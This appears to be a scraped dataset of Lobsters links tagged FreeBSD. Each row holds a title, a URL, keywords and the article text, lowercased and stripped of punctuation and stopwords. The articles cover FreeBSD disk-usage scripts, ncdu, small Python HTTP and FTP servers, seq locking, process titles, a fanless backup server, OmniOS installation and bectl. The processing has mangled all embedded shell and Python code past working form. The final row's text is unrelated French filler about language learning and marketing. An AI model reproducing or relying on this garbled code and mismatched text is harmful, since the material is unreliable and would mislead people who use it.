sg sort n bin boot compat copyright data dev entropy etc lib libexec medium mnt net proc rescue root sbin sys tmp var jail usr home content unix system resource directory flag display unit megabyte cd usr du sm sort n libdata obj test libexec sbin include lib share bin port src local pita type cd du time mention oldschool unix system provide g flag hpux limited kilobyte may also try h human readable sort h sort human readable du variant du smh sort h data net proc sys copyright entropy dev mnt medium tmp libexec bin etc root sbin rescue lib boot compat jail var usr home ncdu come handy ncurses based disk usage analyzer help finding space eater fast time without typing command ncdu action first calculates size file get output sorted size hit enter directory instantly moved directory delete something remember recalculate output r letter also great option spawning shell b current directory toggle apparent size disk usage option latter useful use filesystem builtin compression like zfs k move cursor j move cursor rightenter open selected directory left h open parent directory n sort name ascendingdescending sort size ascendingdescending c sort item ascendingdescending delete selected file directory toggle dirs file sorting g show percentage andor graph toggle apparent size disk usage c toggle display child item count e showhide hidden excluded file show information selected item r recalculate current directory b spawn shell current directory q quit ncdu apparent size using du command disk usage du sm book book apparent size du sma book book compression ratio zfs filesystem gb saved directory file got space back also wanted know directory enormous amount small file first came filescountsh script solution long binsh export lcallc eq dir else dir fi find dir type maxdepth mindepth cut c read find wc l tr n echo done sort n work reliably du sort tandem retype least use cd hit arrow discovered ncdu also count file provide startup argument start count file mode hit c letter instantly display count file scanned directory sort output count file hit c letter large c letter filescountsh script still one advantage ncdu latter stop counting file shown screenshot need search really big amount file filescountsh script accurateadequate cd usr filescountsh obj libdata sbin libexec test bin lib include share src port local big file hidden somewhere deep directory tree du ncdu help usual though short filesbigsh script job binsh export lcallc eq dir else dir fi find dir type f exec stat f doas rm f n sort n example usage var directory cd var filesbigsh tail doas rm f tmpkdecachevermadeniconcachekcache doas rm f doas rm f doas rm f dbpkgrepohardenedbsdsqlite doas rm f dbpkgrepofreebsdsqlite doas rm f dbpkglocalsqlite doas rm f doas rm f dbclamavmaincvd doas rm f dbclamavdailycld doas rm f dbpkgprovidesprovidesdb output executable format select whole line paste terminal file deleted default us doas nothing stop putting sudo sure find useful helped least dozen time many copy keep often find keeping file several place also waste space unless use zfs deduplication course dedupsh script made little larger paste put link following option available may searchcompare file name size fast checksum slow dedupsh usage dedupsh option directory option n check name fast check size medium check slow n n delete instruction printed delete instruction printed delete instruction printed example dedupsh mnt simple usage example cd miscman cp zfsnotes zfstodo dedupsh count doas rm rf zfsnotes doas rm rf zfstodo count doas rm rf doas rm rf xinit copying zfsnotes file zfstodo file wanted show dedupsh print screen accidentally also found another duplicate output dedupsh simple like filesbigsh script selecting line pasting terminal remove duplicate default us doas change sudo work better unusual cron interval u already remember five field crontab file mean would like run command every second reboot answer lie man crontab page exotic option string meaning reboot run startup cron yearly run year annually yearly monthly run month weekly run week daily run day midnight daily hourly run hour everyminute run minute everysecond run second check cron environment many time found lost lot time debugging went wrong script run crontab file often variable missing command script used path variable make debugging faster use envsh script store cron environment cat envsh env tmpenvout envsh script write current environment tmpenvout file let put crontab test crontab l grep env everysecond envsh second check content tmpenvout file cat tmpenvout lognamevermaden pathsbin bin usrsbin usrbin usrlocalsbin usrlocalbin pwdhomevermaden homehomevermaden uservermaden shellbinsh easily debug script run crontab least environment part simple http server found many time situation would want allow download file machine ssh could used python come handy simplehttpserver httpserver python version instantly start http server directory command python version python python simplehttpserver port python python httpserver port even made simple httpsh wrapper script make even easy binsh ne echo usage port exit fi python simplehttpserver example usage cd miscman httpsh serving http port get code message file found get faviconico get bhyve stop simply hit ctrl c interrupt sequence look epiphany browser simple ftp server similarly ftp service another python goodie called pyftpdlib python ftp server library provides mine ftppy wrapper little bigger write quite comlicated setup pyftpdlib mine simple start current directory add read anonymous user readwrite user named writer writer password usrbinenv python sys import argv exit pyftpdlibauthorizers import dummyauthorizer pyftpdlibhandlers import ftphandler pyftpdlibservers import ftpserver len argv print usage argv port print exit authorizer dummyauthorizer authorizeradduser writer writer perm elradfmw authorizeraddanonymous handler ftphandler handlerauthorizer authorizer handlerpassiveports range address argv ftpd ftpserver address handler ftpdserveforever ftppy handy want enable someone upload something machine sshscp possible reason stop simply hit ctrl c interrupt sequence terminal startup log cd miscman ftppy starting ftp server concurrency model async masquerade nat address none passive port firefox render content hope find useful see part day eof like like loading related
316,Lobsters,freebsd,FreeBSD,FreeBSD lockless algorithm - seq,https://oshogbo.vexillium.org/blog/50/,freebsd lockless algorithm seq,freebsd source code,day locking algorithm critical operating system especially multithreaded world time turn classical lock like mutex performance costly even using technique like read writes mutex synchronizing state cpu costly optimize case lockless algorithm started used multiple place kernel need read variable often small number case write case seq interface created first let see writer look lockexclusive obj lock seqwritebegin obj seq change state obj seqwriteend obj seq unlockexclusive obj lock see still using kind barrier editing object protects user multiple writes remember case object nt change often nt need optimize part locking object use special seqwritebegin function notify reader object changed next modification object seqwriteend function used notify reader object changed end unlock lock allow writer modify object performance costly operation need lock unlock lock int sett seq seq seqread obj seq obj obj seqconsistent obj seq seq code showed reader looking first fetching state sequence using seqread function getting variable interested work end checking state sequence changed using seqconsistent function sequance changed fetched value correctly function returned false mean writer changed state object need start fetching one time loop first look look weird case fetching variable nt many writes loop used twice obj variable nt change often algorithm much efficient standard mutex locking need writer side possible let look coult implemented static inline voidseqwritebegin seqt seqp atomicaddrelint seqp static inline voidseqwriteend seqt seqp atomicaddrelint seqp static inline seqtseqread const seqt seqp sett atomicloadacqint deconst seqt seqp return static inline seqtseqconsistent const seqt seqp seqt oldseq return seqp oldseq seqt defined unsigned integer seqwritebegin seqwriteend add one sequence function used create transaction writer seqread function return u current state sequence case sequence odd number case ongoing write structure seqread function spin read sequence one time even number ongoing write return current sequance seqconsistent comparing two number number equal mean succesfully fetched variable case number different mean ongoing write structure write case need start whole process beginning situation illustrated seqread function freebsd using special function spin cpuspinwait simplified purpose examplethereare two theoretical problem algorithm lot writer guarantee thereader finally get data use algorithm sure many writes structure second problem read loop take long time time would writes sequence compassion integer overflow state structure would fetched invalid state however unlikely ever happen post discus lockless algorithm seq freebsd used optimization read structure one requirement using algorithm sure reader writer find whole implementation freebsd source code
317,Lobsters,freebsd,FreeBSD,My FreeBSD Story,https://vermaden.wordpress.com/2018/09/07/my-freebsd-story/,freebsd story,roman zolotarev atari pegasus video computer system video computer system amiga amiga deathbed vigil cmdexe c update roman zolotarev slawomir wojciech wojtczak vermaden like,roman zolotarev asked would write entry tell bsd story page could refuse really tried make short small guess straight first devicescomputersconsoles time remember atari pegasus console hardware clone nintendo ne back even knew atari referred video computer system even knew english took two decade get know accident video computer system atari equipment used playing computer game got amiga computer say parent bought served playing computer game also activity first time amiga computer greatest influence first time studied book amiga workbench operating system learned command amiga shell terminal loved idea ram disk icondirectory desktop allowed transparently put thing system memory still miss concept today desktop system still remember dismal watched amiga deathbed vigil movie end got first pc course came window computer served gaming machine well typical tool one time dig internals window registry left disgusted concept implementation limited command line interface provided cmdexe executable remember heart box cpu motherboard graphic accelerator legendary voodoo card company attitude philosophy also left solid fingerprint way like amiga hence top laptop look like game even released special edition feature support glide driver like need speed ii special edition migration amiga pc never felt right game cool window system horrible time passed different window version hardware modification took place window xp felt really heavy time mention window example even bigger hardware requirement also understand hate window crashed frequency window later window second edition maybe hardware different mine screenshots period lost gb huge drive data movedresized partition partition magic get space le filled c drive day learned hard people backup people backup never lost data multiple copy data netheril fall lost data gone forever always followed various alternative led try linux reading various distribution philosophy decided run slackware linux kde buddy used aurox linux one linux distribution poland encouraged especially context fixing possible problem already knew also recently dumped window system slackware sounded like better idea took path instead first dual booted window xp slackware linux cause everything worked window world often felt helpless linux world would reboot window play game find solution linux problem required remember strange concept dual clipboard primary secondary amazed much better system linux least marketed way need system tray program literally manage clipboard window obvious ctrl c copy ctrl v paste thing linux know feature two clipboard synchronized little system tray program kde also unthinkable lost content lastrecent ctrl c operation close application copy made settled little slackware long really liked manual dependency management package example also kde really ugly despite trying possible option able tweak something nice looking half year slackware checked linux distribution decided try gentoo linux definitely agree image visualizes gentoo linux experience especially install first time course went hardcore version self building stage compiler toolchain horrible idea time compilation slow single core machine took forever many hour got gentoo installed decide desktop environment use read lot good news fluxbox time tried weird experience create everything gui scratch pleasant one recalled time amiga linux came way much often dig gentoo linux read lot gentoo feature based freebsd solution gentoo portage clone freebsd port central etcrcconf system configuration file concept taken freebsd well started gather information freebsd freebsd website freebsd port site still felt little outdated say least discouraged somewhere installed freebsd computer beginning hard like earlier step gentoo similarly like gentoo freebsd project came lot great documentation gentoo documentation concentrated within various gentoo wiki site freebsd project come official documentation form handbook faq remember first question nonexistent bsdforumsorg site example one first one scroll terminal output plain console know push scroll lock button something totally new bsdforumsorg looked like earliest screenshot got period gentoo setup looked similar freebsd openbsd netbsd probably gentoo based concept freebsd solution led freebsd instead bsd operating system currently still use freebsd keep steady eye openbsd hardenedbsd dragonfly bsd solution improvement migration path linux freebsd lot easier configuration file home copied migration quite fast easy fluxbox configuration used gentoo freebsd started fell even like amiga time everything ishas well thought place reason documentation good freebsd community second none even decided upgrade hardware something exotic got server motherboard dual cpu socket athlon xp desktop processor easily modified athlon mp server one got also second one along gb ecc ram dual cpu setup quite unusual time server well switched nvidia binary blob driver software open nv nvidia would break uptime every several day accumulated day uptime desktop box bad system without emergency ups also last time used ecc ram freebsd least box zfs even existed freebsd time flied started feel need something faster also got interested intel graphic card got new motherboard fastest intel graphic card available silly sound asus intel gma terrible idea freebsd graphic stack supported intel graphic card instead one beginning used software vesa driver problem performance driver also quad core intel cpu resolution screen got x screen using limited x real pita decided try something else freebsd intel support finally arrives needed something fast also needed write master thesis time middle wanted try end linux distribution spectrum ubuntu could go desktop way course installed gently gnome environment pulseaudio already unfortunately existed preferred run computer time back payed electricity bill several thing annoyed much example mentioned pulseaudio sound freezed onetwo day using computer even played music video stayed way could restart pulseaudio reload alsa module stayed susfu state situation unchanged still fucked reboot needed finish master thesis time reinstall something else pulseaudio probably similarly broken linux distribution freebsd still lacking intel gma support generally gnome experience bad really missed custom setting keyboard shortcut customized behavior remained pain ubuntu two month time finished master thesis operating system virtualization download read polish use translator needed ubuntu looked back also side journey mac wonderland got opportunity use macbook pro mac o x leopard year allowed get real feel mac ecosystem hardware philosophy repeat stereotype like lot antiapple people switched back freebsd system work felt better used terminalapp mac lot xterm freebsd felt natural make laugh created mac styled fluxbox theme year till got run mac still like mac o x look leopard time time also played solaris later opensolaris must admit time solaris called java desktop based gnome really looking good good mac o x could rival best looking o really liked solaris concept solution like zone zfs also crossbow comstar ip freebsd pngng always got problem desktop software everything freebsd port almost amount application available linux always application lacking solaris world solaris journey also left print soul fluxbox theme went solaris style ubuntu fiasco got motherboard freebsd still supported intel gma card settled freebsd land relief pulseaudio nonsense meantime read lot good experience openbox decided try instead fluxbox strange feeling mess xml configuration file beginning got used ordered rcxml menuxml configuration file properly problem since used freebsd different machine including physical server virtual machine laptop learned adequate supported hardware important factor freebsd ecosystem still use openbox still use freebsd today desktop look like one year using various window unix macosaixhpuxsolarisopensolarisillumosfreebsdopenbsdnetbsd unixlike linux system always come conclusion freebsd system suck least suck least release one day write freebsd great operating system already update roman zolotarev got moment added story tell bsd story page thanks roman may check slawomir wojciech wojtczak vermaden run freebsd page eof like like loading related
318,Lobsters,freebsd,FreeBSD,How does the process title works?,https://oshogbo.vexillium.org/blog/51/,process title work,freebsd setproctitle setproctitlefast gnulinux fsprocarrayc fsprocbasec openbsd openbsd setproctitle netbsd dragonflybsd summary,let start defining title process article understand name reported p top creating new process using fork process inherits name parent scenario call exec function also pas list argument process treated process title would like change title process running turn many operating system different way article discus open source operating system like freebsd linux openbsd netbsd dragonflybsd freebsd jumping topic change process title first let look program like top p create list process instead reading code probably let use ktrace analyze p freebsd p call getuidps ret getuid call sysctl p sctl p ret sysctl call mmap protreadprotwrite mapprivatemapanon p ret mmap call sysctl p sctl p ret sysctl first suspect kernprocuid sysctl sysctl used gather process given user case user uid multiple different oid allow one filter list process specific case use kernprocproc return process thread may notice call sysctl twice first call obtain number process second one two obtain list common pattern obtaining data sysctl unknown sizelet look output ktrace one time p call sysctl p sctl p ret sysctl time use kernprocargspid sysctl finally obtain process argument list also contains process titlein freebsd like bsd operating system family setproctitle function libc library function first appears freebsd idea function borrowed sendmail thesetproctitle function thing first get kernpsstrings sysctl returned value pointer psstrings structure modifying value structure changing process memory done compatibility purpose scenario another step set kernprocargspid sysctl really change process namefrom freebsd exists one additional function setproctitlefast case setproctitle sysctl set value new name function setproctitlefast called sysctl called title set empty string done notify kernel look internal kernel structure read process memory get process title every next call setproctitlefast change value psstring structure save precious syscalls case changing process titlein bsds string given setproctitle preceded value progname changed using setprogname obtained using getprogname setprogrname function nt send signal kernel change memory process changing progname automatically reflected p top output notice kernel change progname additional setproctitle call done source code freebsd setproctitle setproctitlefast gnulinux popular implementation p gnulinux operating system part procpsand found let look like work using strace program stat atfdcwd ordonly bash atfdcwd ordonly name tbashnumask t see p depends straightly onprocfs procfs virtual file system allowing one access kernel data userland case stat status file read procpid directory file contain similar data difference status contains data humanreadable format implementation status file found fsprocarrayc obtain name process proctaskname function file used function read internal structure task contains executable name value controlled prctl prsetname p work default return binary name let try get information using p additional flag u force print useroriented output stat atfdcwd ordonly aout atfdcwd ordonly name taoutnumask t atfdcwd ordonly additional file cmdline procfswas read name suggests file contains completed command line process let look hood see happened cmdline pseudofile implemented fsprocbasec file function responsible getting cmdline getmmcmdline read process memory address argv analysis finally know change process title particular case command line presented user title need manipulate argv main function nt like approach use libbsd gnulinux implement setproctitle openbsd like bsds openbsd also implement setproctitle function libc library although implementation look little bit different compact one freebsd version setproctitle function get vmvmpsstring sysctl sysctl return pointer psstrings structure contains reference current name process modifying process memory name changed address returned sysctl nt change openbsd cache returned value next call setproctitle function nt additional syscallsimplementation openbsd setproctitle netbsd netbsd project also us setproctitle function change name process difference openbsd netbsd nt syscall obtain pointer address psstring structure set start function called main source code netbsd setproctitle dragonflybsd time publishing post dragonflybsd thing freebsd use kernprocargspid sysctl set new process title well kernpsstrings fetch address process memory dragonflybsd nt implement setproctitlefast functionyou analyze dragonflybsd setproctitle summary even simple thing changing process title implemented different philosophy major open source operating system different way motivation research recent change freebsd turn matter setting process title requires additional syscalls application like postgresql change process title often case additional syscall required performance drop noticeable freebsd introduced additional fast way changing process title
319,Lobsters,freebsd,FreeBSD,Insight into Future of TrueOS BSD and Project Trident,https://itsfoss.com/project-trident-interview/,insight future trueos bsd project trident,please log,session expiredplease log login page open new tab logging close return page
321,Lobsters,freebsd,FreeBSD,Silent Fanless FreeBSD Server - DIY Backup,https://vermaden.wordpress.com/2018/08/28/silent-fanless-freebsd-server-diy-backup/,silent fanless freebsd server diy backup,silent fanless freebsd desktopserver bsd episode silence fan asrock celeron supermicro silent fanless freebsd server redundant backup build seagate sata maxtor akyga ancestor cost price component total psu silent fanless freebsd desktopserver gojira power consumption idle load power type configuration configuration low power consumption usb boot drive pv dmesg tail dmesg tail drive usb pvread pvwrite diskinfooverhead diskinfoiops time drive cloud storage price comparison tarsnap backblaze cloud storage self solution electricity cost cost time provider price data time provider price data time provider price data time like,already wrote topic silent fanless freebsd desktopserver article pleasant surprise bsd episode silence fan featured article grateful today would like show another practical example setup hand approach along real power usage measurement power meter also got power efficient asrock motherboard tdp includes celeron cpu also nice small supermicro mini itx case keep mind asrock also made similar motherboard b model name different portsconnectors may better suit need better may also check follow silent fanless freebsd server redundant backup article build supermicro case look like asrock motherboard installed one thing surprised much hard disk cost internal seagate sata drive cost disk sold maxtor disk external case maxtor brand owned seagate anyway usb port cost half least europepoland location think already know going thought use external maxtor drive connect via usb port setup sata iii provides theoretical throughput usb provides theoretical throughput difference important low latency high throughput ssd drive approach speed traditional rotational disk moving gently maximum performance able squeeze maxtor usb drive write speed read speed using pv tool beginning disk speed drop end disk respectively write read operation even approaching sata standard top thus make difference significant one sure storage first wanted make hole motherboard end steel plate somewhere beside back port drill get outside usb cable case attach one usb port back motherboard fortunately got better idea motherboard connector internal usb called front panel usb case bought akyga front panel cable usb port connected everything inside case akyga usb cable going install two usb disk using method would use one cable instead problem physical one blend fit fortunately able find way fit case even space second disk offsite backup replacement stageoffsite backup need create redundant protection definitely possible two maxtor usb drive opened supermicro case asrock motherboard inside attached pico psu look like attached akyga usb cable thing get little narrow proper cable lay still able fit another internal sata disk external usb disk attached akyga cable usb connector motherboard case maxtor disk disk placement required little modification created custom disk holder using steel plate got window mosquito net set home able get something similar hardware shop modified little plier also silenced disk vibration felt sticker silenced disk supermicro case ancestor setup used raspberry pi external western digital usb disk storage space requirement become larger needed increase course geli encryption zfs enabled compression top four humble core soldered ram able squeeze whooping readwrite experience zfsgeli setup hurting used rsync differential backup internet connection box limited would still use setup boot larger maxtor disk requires power already used stronger charger suggested vendor even option bootmsdosconfigtxt help cost complete setup price top total part used price component cpumotherboard asrock miniitx ram crucial psu pico internal psu leader electronics external supermicro used akyga usb cable sandisk fit usb drive system maxtor usb drive data total psu earlier silent fanless freebsd desktopserver article used quite large psu fsp group psus owned thinkpad brick compete size beast motherboard use little power detail lower require lot smaller psu fsp group psu iec slot also requires additional iec power cable make even bigger solution new compact also cost fraction fsp group gojira new leader electronics psu label see comparison also got cheaper le powerful pico psu top power power consumption get really interesting measured power consumption power meter idle box booted without medium attached us power idling system idle sandisk usb drive freebsd installed used power booted maxtor disk inside sandisk usb drive attached run idle power load need full cpu speed limited cpu speed powerd option limit set fully loaded system core busy two dd process read boot sandisk drive maxtor disk geli enabled zfs pool scrub operation progress additional two find process disk would pas barrier without cpu limitation mean intel turbo boost enabled system used power summary power usage box power type configuration w idle system w idle system sandisk drive w idle system sandisk drive maxtor drive cpu ghz limit w idle system sandisk drive maxtor drive w load system sandisk drive maxtor drive cpu ghz limit w load system sandisk drive maxtor drive comparision raspberry pi microsd card attached used know slow used western digital usb drive used idle state configuration low power consumption freebsd configuration file used box lower power consumption etcsysctlconf file annoying thing limit zfs arc efficiently allow upgrade jail allow raw socket jail random pid performanceall shared memory segment mapped unpageable ram memory overcommit see tuning networkdo send rst segment closed port networkdo send port unreachables refused connects networkenable sctp blackholing blackhole detail networkmax size automatic receive buffer networkmax size automatic send buffer networkmaximum socket buffer size networkmaximum listen socket pending connection accept queue size networkdefault tcp maximum segment size networkminimum tcp maximum segment size networklimit synack retransmissions networkuse tcp syn cooky syncache overflow networkenable tcp segmentation offload networkenable ip option processing l srr rr t networkassign random ipid value networkenable sending ip redirects networkignore icmp redirects networkassume sokeepalive tcp connection networkdrop tcp packet synfin set networkrecycle closed connection faster networkcertain icmp unreachable message may abort connection synsent networkmaximum segment lifetime networkenable path mtu discovery networkexpire time tcp hostcache entry networktime delayed ack sent bootloaderconf file boot option bootmuteyes module boot zfsloadyes disable hyper threading reduce number sound generated interrupt racctrctl resource limit pipe kva limit mb number segment per process large page mapping shared memory zfs tuning network max send queue size power device without attached driver ahci power management every used channel ahcich geli thread etcrcconf file network hostnameoffsitelocal backgrounddhclientyes extranetfstypesnfs modulescommonbase kldlist kldlist aesni geomeli kldlist kldlist fuse coretemp sem cpuctl ichsmb cchtcp kldlist kldlist libiconv msdosfsiconv udficonv power economycxlowestcmax powerdenableyes powerdflags n adaptive hiadaptive b adaptive daemon yes zfsenableyes nfsclientenableyes syslogdflagss sshdenableyes daemon sendmailenablenone sendmailsubmitenableno sendmailoutboundenableno sendmailmspqueueenableno f fsckyenableyes cleartmpenableyes cleartmpxyes growfsenableyes keyratefast virecoverenableno updatemotdno devfssystemrulesetdesktop hostidenableno usb boot drive sure use usb drive usb drive freebsd system got version sandisk tested performance pv diskinfo tool pv utility option enabled shown diskinfo c parameter used pv pv aliased pv r b w b dmesg information sandisk fit usb drive dmesg tail bus target lun removable direct access scsi device serial number transfer byte sector dmesg information sandisk fit usb drive dmesg tail bus target lun removable direct access scsi device serial number transfer byte sector also noticeable size difference usb version additional mb space way sandisk fit usb came sticker inside box serial number rescuepro deluxe software never use bad something need may take course unless someone else took already result benchmark tested usb usb port drive usb pvread pvwrite diskinfooverhead diskinfoiops sandisk fit usb sandisk fit usb sandisk fit usb sandisk fit usb also interesting usb version lower throughput iop newer usb incarnation sandisk fit drive also real life test checked long would take boot freebsd system installed loader screen login prompt difference second detail shown time drive sandisk fit usb sandisk fit usb small difference use sandisk fit usb stick little le outside slot shown cloud storage price comparison tarsnap online backup truly paranoid cost price tarsnap data transmitted deduplication compression change much data compressratio property zfs dataset estimate deduplication saving zdb pool command get additional saving let assume deduplication compression would take saving would lower tarsnap price backblaze cloud storage storage cost single disk solution cost let say year expect disk failure period may serve well another year know cloud storage price let calculate price data stored year cloud service self solution electricity cost also need calculate much energy build solution would consume currently power cost europepoland rounded mean running computer power usage hour would cost electricity bill solution idle us fully loaded idle time assume use average would cost u device running hour also find calculation day multiplier year another multiplier year another multiplier cost time hour day year year total year electricity cost building running system nonstop also implement feature like wake lan limit power usage even example cloud storage service provider price provider price data time tarsnap month backblaze month price month keeping data provider look follows provider price data time tarsnap month backblaze month month tarsnap time expensive keeping backup self computer disk backblaze service cost still reasonable let compare price year storage provider price data time tarsnap year backblaze year year backblaze solution time expensive personal setup really want create solution difference year big tarsnap bound time expensive self hosted solution remember also included cost transferring data cloud storage would make cloud storage cost even bigger depending often would want pullpush data eof like like loading related
322,Lobsters,freebsd,FreeBSD,A look beyond the BSD teacup: OmniOS installation,https://eerielinux.wordpress.com/2018/08/25/a-look-beyond-the-bsd-teacup-omnios-installation/,look beyond bsd teacup omnios installation,post illumos omnios ravenports initial omnios impression bsd user z coc exit first attempt installing o omnios omnios kayak installer dialogbased installer next like,five year ago wrote post taking look beyond linux teacup arch linux user back since project like archbsd called pacbsd today arch hurd decided take look write thing changed today happy freebsd user time take look beyond teacup operating system familiar illumos omnios couple reason solaris derivative big community nix family besides linux bsds met far working zfs freebsd read message contain reference illumos certainly help keep awareness course also bit curiosity might o like grew zfs also ravenports project participate planned support solarisillumos right beginning wanted least somewhat prepared support platform would finally land little research various derivative available settled one heard talk last year conference german unix user group omnios solaris rest u would chosen smartos admire bryan cantrill getting know illumos prefer traditional installation runfromram system also meme freebsd got thinking internet meme making fun freebsd course freebsd run corporation especially compared state linux come sponsoring openbsd also take come freebsd developer probably truth claim using macos desktop system openbsd devs likely develop o choice statement every innovation past decade come solaris bhyve alone prof wrong let honest two major technology make freebsd great platform today zfs dtrace actually come solaris pam originates modern way managing service well also hear good thing zone lot small utility general end lack time made cheat go easiest road create vagrantfile pull vm image net someone else worked make sure raven package work omnios determined return though someday know thing go someday pretty common alias probably never actually heard forum post bsdnow podcast title initial omnios impression bsd user caught attention read written somebody used freebsd year loathed new code conduct enough leave also oppose conduct made pretty clear february post z coc exit stated stayed favorite o continue advocate decided stop reading post try thing instead finally found time first attempt installing o omnios offer image three branch stable lts bloody stable release made available twice year every fourth release supported three year lts instead one bloody image le development snapshot meant advanced user want test newest feature downloaded latest stable iso spun vm virtual box thing went familiar boot loader ah good old beastie menu nice ascii artwork omnios used grub long ago freebsd loader ported illumos good choice two installers available look like team created new installer curious person want know like went old textbased installer text installer keymap selection much surprise first thing selecting right keymap zfs pool creation option ok next time create zfs pool operating system install seems like illumos term rpool resource pool guess since exploring o first time picked option nothing happened well exactly true since message appears fraction second press blink briefly hm kept key pressed try best read saying kayakinstallerkayakmenu kayakinstallerfindandinstall found file directory oops look like something broken current install deadend pretty early however since friend open source filed issue omnios kayak installer developer responded next day issue solved left good impression quality development show never introduce bug nearly impossible even really lame program react bug found two thumb omnios latest pr freebsd rotting year dialogbased installer great opportunity test new installer well work dialogbased installer keymap selection back track dialogbased installer keymap selection done via simple menu zfs pool creation option ok pool creation time new installer disk selection find drive giving choice install course pretty easy decision make case vm one virtual drive zfs root pool configuration next installer allows setting option regarding pool nice see uefi seems already supported vm went bios gpt though hostname selection hostname set impatient uncreative suggests omniosce much installer could set apart need time zone selection another important system configuration time zone setting since lot time zone make sense group together continent instead providing one large list look pretty familiar o installation time zone selection next menu allows selecting actual time zone time zone confirmation ok confirmation screen chance review setting probably hurt actual copying o data alright actual installation file pool start installer success moment later installation finished cool even created boot environment good see tightly integrated system last step finally time reboot installer offering basic configuration system case want basic configuration option decided probably learn force figure configure stuff course curious though took peek choose create user another vm actually write installer get decide want make administrative user whether give sudo privilege want allow passwordless sudo nice first start preparing service rebooting string loading made smile curious come first boot take bit longer since service description need parsed terribly long delay though first login new system first login omnios system installed next part one part two try make system useful far run problem able solve time figure thing next post let see manage get working report failure like like loading related
323,Lobsters,freebsd,FreeBSD,New ZFS Boot Environments Tool,https://vermaden.wordpress.com/2018/08/24/new-zfs-boot-environments-tool/,new zfs boot environment tool,zfs boot environment pbug beadm beadm beadm bug ideafeature request include beadm base bectl bectl beadm sysutilsbeadm binsh bectl beadm bectl comparison bectl beadm bectl beadm beadm bectl bectl bectl beadm bectl rename safe new zfs rename u beadm bectl bectl list zfs list grep safe zfs rename u zrootrootsafe zrootrootnew bectl bectl list bectl beadm bectl bectl list bectl jail default pwd l exit jls mount grep default bectl unjail default jls bectl beadm bectl beadm bectl bectl list beadm destroy safe n bectl destroy safe bectl list bectl beadm bectl raw beadm bectl beadm bectl jail unjail bectl update new zfs boot environment tool bsd openbsd surfacing update like,month ago honored give talk zfs boot environment pbug end presentation mentioned history tool manage zfs boot environment freebsd pawel jakub dawidek also pbug meeting suggested try add beadm freebsd base system also heard idea many beadm user repetitively asked beadm freebsd base system finished pbug exactly created new pr bug ideafeature request include beadm base positive surprise included new bectl tool freebsd base new member zfs boot environment tool family bectl tool course maintain update beadm tool still available freebsd port sysutilsbeadm category tool written posix binsh allows fast debugging easy change tool short tldr bectl tool beadm implemented c language imported freebsd base mean part freebsd currently bectl already available image comparison new bectl tool early stage yet offer full replacement beadm tool quick comparision usage information bectl beadm tool root beadm usage beadm activate beadm create e nonactivebe e bename snapshot beadm create beadm destroy f beadm list h beadm rename beadm mount mountpoint beadm umount unmount f beadm version new bectl tool root bectl missing command usage bectl h subcommand args bectl activate bename bectl create e nonactivebe e bename snapshot bename bectl create bename snapshot bectl destroy f bename bename bectl export sourcebe bectl import targetbe bectl jail keyvalue u key bootenv bectl list h bectl mount bename mountpoint bectl rename origbename newbename bectl ujail unjail jailname bootenv bectl umount unmount f bename example bectl able rename currently usedmounted boot environment beadm root bectl rename safe new boot environment already mounted failed rename bootenv safe new possible rename zfs dataset mounted zfs rename u command exactly beadm hood workaround bectl tool root bectl list active mountpoint space created safe nr default root zfs list grep safe zrootrootsafe root zfs rename u zrootrootsafe zrootrootnew listed usual new name bectl shown root bectl list active mountpoint space created new nr default one nice addition bectl beadm lack dynamic freebsd jail creation specified boot environment bectl freebsd jail creation action root bectl list active mountpoint space created new nr default root bectl jail default pwd l cshrc bin entropy libexec net root usr profile boot etc medium proc sbin var copyright dev lib mnt rescue tmp zroot exit root jls jid ip address hostname path default tmpbemountonrc root mount grep default zrootrootdefault tmpbemountonrc zfs local noatime root bectl unjail default root jls jid ip address hostname path movemigrate bectl beadm also careful bectl ask question example beadm tool asks sure want destroy specified boot environment bectl tool remove without even writing anything screen root bectl list active mountpoint space created new nr default root beadm destroy safe sure want destroy safe action undone n n root bectl destroy safe root bectl list active mountpoint space created new nr one thing bectl lack also ansible plugin beadm supported ansible plugin prefer use configuration management tool bectl backport raw ansible module good information beadm bectl work together host choose may still use beadm tool daily task ansible module bectl jailunjail option example think time bectl needed feature added tool freebsd base system welcome addition update new zfs boot environment tool article featured bsd openbsd surfacing episode thanks mentioning update finally time check new bectl command newer release possible improvement bectl display missing command invoked without argument possible rename currently used boot environment bectl command last thing noticed bectl jail command leave enabledrunning jail exit cosmetic important last least easiest path migration create simple alias alias beadmbectl csh shell alias beadm bectl eof like like loading related
324,Lobsters,freebsd,FreeBSD,Native Encryption for ZFS on FreeBSD CFT,https://lists.freebsd.org/pipermail/freebsd-current/2018-August/070832.html,native encryption zfs freebsd cft,,
325,Lobsters,freebsd,FreeBSD,"Apple, Cisco, Citrix, Dell, iXsystems, Juniper, Netflix, WhatsApp are hiring BSD devs and admins",https://www.bsdjobs.com/?100,apple cisco citrix dell ixsystems juniper netflix whatsapp hiring bsd devs admins,,comprendre plusieurs langues est aujourd hui indispensable non seulement pour une bonne ouverture esprit mais aussi pour insérer facilement sur le plan professionnel il est vrai que beaucoup de programme scolaires intègrent l apprentissage une ou plusieurs langues étrangères seule la discipline personnelle et la volonté permettent atteindre effectivement l objectif du multilinguisme envie apprendre une nouvelle langue il existe un programme qui empêche le publicités apparaître sur vos diver site web c est bien adblock il filtre le données personnelles de utilisateurs en effet il bloque le différents portails ouverts ce qui provoque la non réception de diver annonces se rend clairement compte qu il n apporte aucun avantage à l utilisateur comment faire alors le marketing affiliation est une façon très simple de faire du profit effectivement il suffira de vendre par le biais une plateforme web le produits une entreprise toutefois pour avoir du succès dans ce domaine vous devrez sacrifier du temp et investir de l argent comprendre le principe fondamentaux si vous ne savez pa ce que cuire du poisson au four en l assaisonnant avec de tomates du citron ou de l huile olive permet de ressortir chaque saveur et arome qui réside dans le poisson vous ne savez pa comment vous prendre pour la cuisson de votre poisson au four voici donc quelques conseils qui vous permettront de vous en il est très facile de louper s vacances si n pa un planning logique et bien détaillé en tête pour cela découvrez dans cet article conseils infaillibles pour avoir de vacances inoubliables choisir avance votre destination c est un moyen infaillible de participer activement à la réussite de vos vacances ainsi vous êtes sûr le commerce en ligne est un business qui rapporte pa mal argent grâce à de petits investissements mais pour avoir beaucoup de revenus certaines disposition sont à prendre pour savoir quelle stratégie utiliser pour augmenter votre chiffre affaire à travers le commerce en ligne lisez le présent article qui vous propose quelques astuces travaillez votre le saviezvous savoir gérer un conflit entre collaborateurs lorsqu est manager une entreprise c est important le conflit est une situation qui peut affecter le fonctionnement et le activités une entreprise le situation conflictuelles qui persistent peuvent devenir avec le temp une source de démobilisation importante cela pourrait être difficile à surmonter si aucune action parler aujourdhui de la mode sans se référer aux magazine 